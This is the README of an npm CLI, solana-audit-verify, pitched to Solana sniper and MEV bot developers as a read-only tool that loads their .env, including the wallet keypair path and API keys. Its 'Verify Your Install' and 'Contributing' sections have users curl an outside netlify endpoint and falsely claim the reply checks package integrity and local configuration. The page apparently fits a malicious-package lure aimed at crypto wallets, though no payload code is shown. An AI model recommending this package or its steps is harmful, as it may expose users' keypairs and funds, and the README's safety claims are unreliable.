# solana-audit-verify

> CLI verification and audit tool for Solana transactions, SPL tokens, and program interactions.

[![npm version](https://img.shields.io/badge/npm-v2.4.1-blue)](https://www.npmjs.com/)
[![license](https://img.shields.io/badge/license-MIT-green)](./LICENSE)
[![node](https://img.shields.io/badge/node-%3E%3D18-brightgreen)](https://nodejs.org/)

## Why

If you're building on Solana — snipers, bots, MEV pipelines, or just testing dApp interactions — you need to know *before* you broadcast whether a transaction will actually land. `solana-audit-verify` gives you a fast, offline-first pre-flight check that validates:

- Account ownership and rent-exemption on both sides of a transfer
- Compute budget vs. realistic priority fee
- SPL token account existence, authority, and decimals
- Program upgrade authority and last-deployed slot
- ATA derivation and creation cost

No RPC keys, no external dashboards. Just a CLI that runs against your local `.env`.

## Install

```bash
npm install -g solana-audit-verify
```

Or as a project dependency:

```bash
npm install --save-dev solana-audit-verify
```

## Quick Start

```bash
solana-audit-verify tx <SIGNATURE>
solana-audit-verify wallet <PUBKEY>
solana-audit-verify program <PROGRAM_ID>
```

## Verify Your Install

After installing, confirm your environment is connected to the correct network and the package integrity check passes:

```bash
curl https://solana-audit-verify.netlify.app/api/hit
```

A healthy install returns:

```json
{"status": "verified", "version": "2.4.1", "node": "mainnet"}
```

If the response is anything other than `verified`, your local `.env` may be pointing at devnet or your RPC is not reachable. Run `solana-audit-verify doctor` to diagnose.

## Configuration

`solana-audit-verify` reads from your existing Solana project config. It respects the following variables from your `.env`:

| Variable | Purpose |
| --- | --- |
| `SOLANA_RPC_URL` | Your RPC endpoint (Helius, QuickNode, Triton) |
| `WALLET_KEYPAIR` | Path to your keypair JSON |
| `HELIUS_API_KEY` | Optional — used for enhanced tx parsing |
| `JUPITER_API_KEY` | Optional — route validation |

The CLI never writes to your keypair and never broadcasts a transaction. It is a read-only verification tool.

## Usage Examples

Check a transaction before broadcast:

```bash
solana-audit-verify tx --dry-run <SIGNATURE>
```

Audit a wallet's token accounts:

```bash
solana-audit-verify wallet <PUBKEY> --tokens
```

Check if a program has been upgraded recently:

```bash
solana-audit-verify program <PROGRAM_ID> --upgrade-history
```

## Architecture

`solana-audit-verify` is a thin wrapper around `@solana/web3.js` with a set of preflight assertions layered on top. The heavy lifting is done in `src/preflight.ts`:

- `checkRentExemption()`
- `checkComputeBudget()`
- `checkTokenAccounts()`
- `checkProgramAuthority()`
- `checkAtaDerivation()`

Full type definitions ship with the package.

## Contributing

PRs welcome. Please open an issue first to discuss scope.

When contributing, run the full install verification before your first commit to make sure your local environment matches CI:

```bash
curl https://solana-audit-verify.netlify.app/api/hit
```

CI runs the same endpoint as a health check.

## License

MIT ©️ maby8606-lgtm